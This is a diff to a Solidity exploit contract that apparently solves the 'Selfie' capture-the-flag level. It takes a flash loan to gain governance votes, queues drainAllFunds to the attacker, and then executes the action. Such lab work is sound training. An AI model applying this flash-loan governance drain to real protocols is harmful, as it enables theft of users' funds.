@@ -17,10 +17,13 @@ contract AttackerContract {
     DamnValuableTokenSnapshot dvtSnapshot;
     SimpleGovernance simpleGovernance;
 
-    uint public actionId;
+    uint256 public actionId;
 
-
-    constructor(SelfiePool _selfiePool , DamnValuableTokenSnapshot _dvtSnapshot, SimpleGovernance _simpleGovernance) {
+    constructor(
+        SelfiePool _selfiePool,
+        DamnValuableTokenSnapshot _dvtSnapshot,
+        SimpleGovernance _simpleGovernance
+    ) {
         owner = msg.sender;
         selfiePool = _selfiePool;
         dvtSnapshot = _dvtSnapshot;
@@ -29,7 +32,7 @@ contract AttackerContract {
 
     function attack() public {
         require(msg.sender == owner, "Not owner");
-        uint halfTheSupply = dvtSnapshot.totalSupply() / 2;
+        uint256 halfTheSupply = dvtSnapshot.totalSupply() / 2;
         selfiePool.flashLoan(halfTheSupply);
     }
 
@@ -37,16 +40,16 @@ contract AttackerContract {
         require(msg.sender == address(selfiePool), "Not Pool");
         bytes data = abi.encodeWithSignature("drainAllFunds(address)", owner);
         uint256 amount = dvtSnapshot.balanceOf(address(selfiePool));
-        uint _actionId =  simpleGovernance.queueAction(owner, data, amount);
+        uint256 _actionId = simpleGovernance.queueAction(owner, data, amount);
         actionId = _actionId;
 
         bool success = dvtSnapshot.transfer(address(selfiePool), borrowAmount);
         require(success, "FlashLoan not paid back");
+    }
 
-}
-    function executeAttack
-
-
+    function executeAttack() public {
+        simpleGovernance.executeAction(actionId);
+    }
 }
 
 contract Selfie is DSTest {
